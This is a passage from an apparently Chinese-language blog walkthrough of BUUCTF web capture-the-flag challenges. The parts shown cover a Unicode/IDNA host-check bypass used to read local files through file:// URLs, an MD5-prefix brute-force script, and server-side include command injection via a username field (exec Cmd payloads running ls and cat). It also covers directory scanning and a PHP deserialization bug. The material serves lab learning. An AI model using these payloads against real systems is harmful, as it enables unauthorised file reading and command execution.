urllib.request.urlopen(finalUrl).read()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;我扌 your problem? 333&quot;</span></span><br></pre></td></tr></table></figure>



<p>这里先从最后的23行打开url并读取内容处入手, 这里可以通过在<code>url</code>范畴中的<code>file://</code>协议来读取本地文件,但前提是这里我们给的<code>url</code>中必须包含<code>suctf.cc</code>,且不能在前面被检测出来</p>
<p>关于URL: 完整格式为:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">scheme:[//[user[:password]@]host[:port]][/path][?query][#fragment]</span><br><span class="line">协议://用户:密码@主机host:端口/路径path#片段</span><br></pre></td></tr></table></figure>

<p>所以,在<code>&quot;https://username:password@www.baidu.com:80/index.html;parameters?name=tom#example&quot;</code> 中:</p>
<p><strong><code>host</code>部分就是<code>www.baidu.com</code></strong></p>
<p>关于<code>urllib.parse.urlparse</code>和<code>urllib.parse.urlsplit</code>   <strong>都是解析url的,前者粒度更细:</strong></p>
<p><code>urllib.parse.urlparse</code>解析后的结果中包含:</p>
<table>
<thead>
<tr>
<th align="left">属性</th>
<th align="left">索引</th>
<th align="left">值</th>
<th align="left">值（如果不存在）</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>scheme</code></td>
<td align="left">0</td>
<td align="left">URL 协议说明符</td>
<td align="left"><em>scheme</em> 参数</td>
</tr>
<tr>
<td align="left"><code>netloc</code></td>
<td align="left">1</td>
<td align="left">网络位置部分</td>
<td align="left">空字符串</td>
</tr>
<tr>
<td align="left"><code>path</code></td>
<td align="left">2</td>
<td align="left">分层路径</td>
<td align="left">空字符串</td>
</tr>
<tr>
<td align="left"><code>params</code></td>
<td align="left">3</td>
<td align="left">Parameters for last path element</td>
<td align="left">空字符串</td>
</tr>
<tr>
<td align="left"><code>query</code></td>
<td align="left">4</td>
<td align="left">查询组件</td>
<td align="left">空字符串</td>
</tr>
<tr>
<td align="left"><code>fragment</code></td>
<td align="left">5</td>
<td align="left">片段标识符</td>
<td align="left">空字符串</td>
</tr>
<tr>
<td align="left"><code>username</code></td>
<td align="left"></td>
<td align="left">用户名</td>
<td align="left"><a target="_blank" rel="noopener" href="https://docs.python.org/zh-cn/3/library/constants.html#None"><code>None</code></a></td>
</tr>
<tr>
<td align="left"><code>password</code></td>
<td align="left"></td>
<td align="left">密码</td>
<td align="left"><a target="_blank" rel="noopener" href="https://docs.python.org/zh-cn/3/library/constants.html#None"><code>None</code></a></td>
</tr>
<tr>
<td align="left"><code>hostname</code></td>
<td align="left"></td>
<td align="left">主机名（小写）</td>
<td align="left"><a target="_blank" rel="noopener" href="https://docs.python.org/zh-cn/3/library/constants.html#None"><code>None</code></a></td>
</tr>
<tr>
<td align="left"><code>port</code></td>
<td align="left"></td>
<td align="left">端口号为整数（如果存在）</td>
<td align="left"><a target="_blank" rel="noopener" href="https://docs.python.org/zh-cn/3/library/constants.html#None"><code>None</code></a></td>
</tr>
</tbody></table>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlsplit, urlparse</span><br><span class="line">url = <span class="string">&quot;https://username:password@www.baidu.com:80/index.html;parameters?name=tom#example&quot;</span></span><br><span class="line"><span class="built_in">print</span>(urlsplit(url))</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">SplitResult(</span></span><br><span class="line"><span class="string">    scheme=&#x27;https&#x27;, </span></span><br><span class="line"><span class="string">    netloc=&#x27;username:password@www.baidu.com:80&#x27;, </span></span><br><span class="line"><span class="string">    path=&#x27;/index.html;parameters&#x27;, </span></span><br><span class="line"><span class="string">    query=&#x27;name=tom&#x27;, </span></span><br><span class="line"><span class="string">    fragment=&#x27;example&#x27;)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(urlparse(url))</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">ParseResult(</span></span><br><span class="line"><span class="string">    scheme=&#x27;https&#x27;, </span></span><br><span class="line"><span class="string">    netloc=&#x27;username:password@www.baidu.com:80&#x27;, </span></span><br><span class="line"><span class="string">    path=&#x27;/index.html&#x27;, </span></span><br><span class="line"><span class="string">    params=&#x27;parameters&#x27;, </span></span><br><span class="line"><span class="string">    query=&#x27;name=tom&#x27;, </span></span><br><span class="line"><span class="string">    fragment=&#x27;example&#x27;</span></span><br><span class="line"><span class="string">)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>



<p>所以上面如果要使用<code>file://</code>来读取文件, 要保证<code>host</code>部分是<code>suctf.cc</code>, 则url的格式就需要是:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file://suctf.cc/path   这里path是本地文件的具体路径</span><br></pre></td></tr></table></figure>

<p>但这里还需要绕过前面对<code>suctf.cc</code>的过滤,因为<code>newhost.append(h.encode(&#39;idna&#39;).decode(&#39;utf-8&#39;))</code>这一句的规范化在前两次检测后面, 所以可以将<code>suctf.cc</code>中的字符换成其他<code>unicode</code>字符来绕过前面的检测, 而这些特殊字符会在规范化时被替换成正确的字符,从而通过最后一次检测成功读取文件,例如</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">file://suctf.cᶜ/</span><br><span class="line">输出:</span><br><span class="line">我扌 your problem? 333</span><br></pre></td></tr></table></figure>

<p>这里爆了333错误,说明已经通过了过滤,现在需要考虑读取哪些文件</p>
<p>源码里提示了<code>nginx</code>,那么读取一下<code>nginx</code>的配置文件试试</p>
<p>可能的路径:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/etc/nginx/nginx.conf</span><br><span class="line">/usr/local/nginx/conf/nginx.conf</span><br></pre></td></tr></table></figure>

<p>但尝试了:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">file://suctf.cᶜ/usr/local/nginx/conf/nginx.conf</span><br><span class="line">file://suctf.cᶜ/etc/nginx/nginx.conf</span><br><span class="line">都会爆 333 错误, 说明ᶜ没有成功被规范化处理,系统仍然认为它和c是不同的两个字符</span><br></pre></td></tr></table></figure>

<p>那么再换一个其他的字符:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">file://suctf.cⅽ/usr/local/nginx/conf/nginx.conf</span><br><span class="line">读取成功: 得到了flag的路径</span><br><span class="line">server &#123;</span><br><span class="line">    listen 80;</span><br><span class="line">    location / &#123;</span><br><span class="line">        try_files $uri @app;</span><br><span class="line">    &#125;</span><br><span class="line">    location @app &#123;</span><br><span class="line">        include uwsgi_params;</span><br><span class="line">        uwsgi_pass unix:///tmp/uwsgi.sock;</span><br><span class="line">    &#125;</span><br><span class="line">    location /static &#123;</span><br><span class="line">        alias /app/static;</span><br><span class="line">    &#125;</span><br><span class="line">    # location /flag &#123;</span><br><span class="line">    #     alias /usr/fffffflag;</span><br><span class="line">    # &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>接下来读取flag文件就可以了:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getUrl?url=file://suctf.cⅽ/usr/fffffflag</span><br></pre></td></tr></table></figure>

<br>

<hr>
<br>



<h1 id="md5爆破-vim泄露-shtml执行命令-EasySearch"><a href="#md5爆破-vim泄露-shtml执行命令-EasySearch" class="headerlink" title="[md5爆破,vim泄露,shtml执行命令]EasySearch"></a>[md5爆破,vim泄露,shtml执行命令]EasySearch</h1><p>存在<code>vim泄露</code>访问 <code>index.php.swp</code>获得源码:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="title function_ invoke__">ob_start</span>();</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">get_hash</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="variable">$chars</span> = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()+-&#x27;</span>; <span class="comment">#共73个字符</span></span><br><span class="line">		<span class="variable">$random</span> = <span class="variable">$chars</span>[<span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>,<span class="number">73</span>)].<span class="variable">$chars</span>[<span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>,<span class="number">73</span>)].<span class="variable">$chars</span>[<span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>,<span class="number">73</span>)].<span class="variable">$chars</span>[<span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>,<span class="number">73</span>)].<span class="variable">$chars</span>[<span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>,<span class="number">73</span>)];<span class="comment">//Random 5 times   随机选5个字符拼接成字符串</span></span><br><span class="line">		<span class="variable">$content</span> = <span class="title function_ invoke__">uniqid</span>().<span class="variable">$random</span>; <span class="comment">// 生成一个唯一id,后面拼接上刚刚获得的长度为5的随机字符串</span></span><br><span class="line">		<span class="keyword">return</span> <span class="title function_ invoke__">sha1</span>(<span class="variable">$content</span>); </span><br><span class="line">	&#125;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);</span><br><span class="line">	***</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) <span class="keyword">and</span> <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>] != <span class="string">&#x27;&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$admin</span> = <span class="string">&#x27;6d0bc1&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span> ( <span class="variable">$admin</span> == <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]),<span class="number">0</span>,<span class="number">6</span>)) &#123; <span class="comment">//密码md5值的前6位需要是&#x27;6d0bc1&#x27;才能正常登录</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;[+] Welcome to manage system&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">            <span class="variable">$file_shtml</span> = <span class="string">&quot;public/&quot;</span>.<span class="title function_ invoke__">get_hash</span>().<span class="string">&quot;.shtml&quot;</span>;</span><br><span class="line">            <span class="variable">$shtml</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$file_shtml</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Unable to open file!&quot;</span>);</span><br><span class="line">            <span class="variable">$text</span> = <span class="string">&#x27;</span></span><br><span class="line"><span class="string">            ***</span></span><br><span class="line"><span class="string">            ***</span></span><br><span class="line"><span class="string">            &lt;h1&gt;Hello,&#x27;</span>.<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>].<span class="string">&#x27;&lt;/h1&gt; // 这里username可以拿来执行命令</span></span><br><span class="line"><span class="string">            ***</span></span><br><span class="line"><span class="string">			***&#x27;</span>;</span><br><span class="line">            <span class="title function_ invoke__">fwrite</span>(<span class="variable">$shtml</span>,<span class="variable">$text</span>);</span><br><span class="line">            <span class="title function_ invoke__">fclose</span>(<span class="variable">$shtml</span>);</span><br><span class="line">            ***</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&quot;[!] Header  error ...&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;[!] Failed&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">            </span><br><span class="line">    &#125;<span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">	***</span><br><span class="line">    &#125;</span><br><span class="line">	***</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>密码<code>md5</code>值的前6位需要是<code>6d0bc1</code>才能正常登录,那么首先需要爆破一下符合这样条件的字符串:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line">chars = [<span class="built_in">chr</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">128</span>)]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> s <span class="keyword">in</span> itertools.product(chars, repeat=<span class="number">4</span>):</span><br><span class="line">    <span class="comment"># 此迭代器product可以叠加笛卡尔积,repeat设为4,也就是chars中字符的任意4位组合</span></span><br><span class="line">    m = <span class="string">&quot;&quot;</span>.join(s)</span><br><span class="line">    <span class="keyword">if</span> md5(m.encode()).hexdigest()[:<span class="number">6</span>] == <span class="string">&#x27;6d0bc1&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span>(m)</span><br><span class="line"><span class="comment"># 学到了,利用itertools.product来迭代任意组合,只用for的话需要嵌套才能做到</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#执行结果:</span></span><br><span class="line"> Rbl</span><br><span class="line">RhPd</span><br><span class="line">d`H6</span><br><span class="line">kX!&#125;</span><br></pre></td></tr></table></figure>

<p>使用爆破出来的密码成功登录, 这里响应头中提示了我们url</p>
<p><img src="/images/buuctf-web2/image-20221023181519105.png" alt="image-20221023181519105"></p>
<p>尝试利用<code>username</code>来向目标文件写入一句话木马,然后按照提示的路径访问并执行命令, 但是没有成功</p>
<img src="/images/buuctf-web2/image-20221023182531101.png" alt="image-20221023182531101" style="zoom:67%;" />

<p><strong>新知识点: <code>shtml</code>文件可以执行系统命令, 格式为:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--#exec Cmd=&quot;命令&quot;--&gt;</span><br></pre></td></tr></table></figure>

<p>那么:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username=&lt;!--#exec Cmd=&quot;ls /&quot;--&gt;&amp;password=RhPd</span><br><span class="line">返回路径:public/ee9c0aaa3117e3ddba01d553acd4d3bb279b6ba0.shtml</span><br></pre></td></tr></table></figure>

<p>访问这个路径,成功回显了执行结果:</p>
<img src="/images/buuctf-web2/image-20221023183046479.png" alt="image-20221023183046479" style="zoom:67%;" />

<p>找一下flag:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username=&lt;!--#exec Cmd=&quot;ls /var/www/html&quot;--&gt;&amp;password=RhPd</span><br><span class="line">Url_is_here: public/91d348bdde783b66958a00e16e2d24690dddb6d1.shtml</span><br></pre></td></tr></table></figure>

<img src="/images/buuctf-web2/image-20221023183312510.png" alt="image-20221023183312510" style="zoom:67%;" />

<p>获得flag:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username=&lt;!--#exec Cmd=&quot;cat /var/www/html/flag_990c66bf85a09c664f0b6741840499b2&quot;--&gt;&amp;password=RhPd</span><br><span class="line">Url_is_here: public/ed4a75977a0eb529d431e7d8ece70454361578b5.shtml</span><br></pre></td></tr></table></figure>



<br>

<hr>
<br>

<h1 id="cookie-Kookie"><a href="#cookie-Kookie" class="headerlink" title="[cookie]Kookie"></a>[cookie]Kookie</h1><p><img src="/images/buuctf-web2/image-20221023191627611.png" alt="image-20221023191627611"></p>
<p>根据提示,使用 cookie&#x2F;monster 来登录</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?action=login&amp;username=cookie&amp;password=monster</span><br></pre></td></tr></table></figure>

<p><img src="/images/buuctf-web2/image-20221023191708409.png" alt="image-20221023191708409"></p>
<p>登录之后根据响应中的提示, 加上个cookie字段:</p>
<p><img src="/images/buuctf-web2/image-20221023191815424.png" alt="image-20221023191815424"></p>
<br>

<hr>
<br>

<h1 id="长度增加的反序列化字符串逃逸-www-zip-piapiapia"><a href="#长度增加的反序列化字符串逃逸-www-zip-piapiapia" class="headerlink" title="[长度增加的反序列化字符串逃逸,www.zip]piapiapia"></a>[长度增加的反序列化字符串逃逸,<a href="http://www.zip]piapiapia">www.zip]piapiapia</a></h1><p>上来又是用户名和密码的输入框,试了半天也没找到注入点</p>
<p>扫一下网站目录:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">py dirsearch.py -u &quot;http://36244f13-8785-4f24-85c0-9a40803e9231.node4.buuoj.cn:81/&quot; --delay=2</span><br></pre></td></tr></table></figure>

<p><img src="/images/buuctf-web2/image-20221023194716766.png" alt="image-20221023194716766"></p>
<p>访问<code>/www.zip</code>下载到源码备份</p>
<p><code>index.php</code>:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">require_once</span>(<span class="string">&#x27;class.php&#x27;</span>);</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>]) &#123;</span><br><span class="line">		<span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: profile.php&#x27;</span>);</span><br><span class="line">		<span class="keyword">exit</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>] &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]) &#123;</span><br><span class="line">		<span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">		<span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$username</span>) &lt; <span class="number">3</span> <span class="keyword">or</span> <span class="title function_ invoke__">strlen</span>(<span class="variable">$username</span>) &gt; <span class="number">16</span>) </span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&#x27;Invalid user name&#x27;</span>);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$password</span>) &lt; <span class="number">3</span> <span class="keyword">or</span> <span class="title function_ invoke__">strlen</span>(<span class="variable">$password</span>) &gt; <span class="number">16</span>) </span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&#x27;Invalid password&#x27;</span>);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">login</span>(<span class="variable">$username</span>, <span class="variable">$password</span>)) &#123;</span><br><span class="line">			<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="variable">$username</span>;</span><br><span class="line">			<span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: profile.php&#x27;</span>);</span><br><span class="line">			<span class="keyword">exit</span>;	</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&#x27;Invalid user name or password&#x27;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>profile.php</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">require_once</span>(<span class="string">&#x27;class.php&#x27;</span>);</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] == <span class="literal">null</span>) &#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&#x27;Login First&#x27;</span>);	</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="variable">$username</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">	<span class="variable">$profile</span>=<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">show_profile</span>(<span class="variable">$username</span>);</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$profile</span>  == <span class="literal">null</span>) &#123;</span><br><span class="line">		<span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: update.php&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="variable">$profile</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$profile</span>); <span class="comment"># 反序列化, profile来自$user-&gt;show_profile($username);</span></span><br><span class="line">		<span class="variable">$phone</span> = <span class="variable">$profile</span>[<span class="string">&#x27;phone&#x27;</span>];</span><br><span class="line">		<span class="variable">$email</span> = <span class="variable">$profile</span>[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line">		<span class="variable">$nickname</span> = <span class="variable">$profile</span>[<span class="string">&#x27;nickname&#x27;</span>];</span><br><span class="line">		<span class="variable">$photo</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$profile</span>[<span class="string">&#x27;photo&#x27;</span>])); <span class="comment"># 读取文件</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>class.php</code>:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span>(<span class="string">&#x27;config.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">user</span> <span class="keyword">extends</span> <span class="title">mysql</span></span>&#123;</span><br><span class="line">	<span class="keyword">private</span> <span class="variable">$table</span> = <span class="string">&#x27;users&#x27;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">is_exists</span>(<span class="params"><span class="variable">$username</span></span>) </span>&#123;</span><br><span class="line">		<span class="variable">$username</span> = <span class="built_in">parent</span>::<span class="title function_ invoke__">filter</span>(<span class="variable">$username</span>);</span><br><span class="line"></span><br><span class="line">		<span class="variable">$where</span> = <span class="string">&quot;username = &#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">parent</span>::<span class="title function_ invoke__">select</span>(<span class="variable">$this</span>-&gt;table, <span class="variable">$where</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">register</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$password</span></span>) </span>&#123;</span><br><span class="line">		<span class="variable">$username</span> = <span class="built_in">parent</span>::<span class="title function_ invoke__">filter</span>(<span class="variable">$username</span>);</span><br><span class="line">		<span class="variable">$password</span> = <span class="built_in">parent</span>::<span class="title function_ invoke__">filter</span>(<span class="variable">$password</span>);</span><br><span class="line"></span><br><span class="line">		<span class="variable">$key_list</span> = <span class="title function_ invoke__">Array</span>(<span class="string">&#x27;username&#x27;</span>, <span class="string">&#x27;password&#x27;</span>);</span><br><span class="line">		<span class="variable">$value_list</span> = <span class="title function_ invoke__">Array</span>(<span class="variable">$username</span>, <span class="title function_ invoke__">md5</span>(<span class="variable">$password</span>));</span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">parent</span>::<span class="title function_ invoke__">insert</span>(<span class="variable">$this</span>-&gt;table, <span class="variable">$key_list</span>, <span 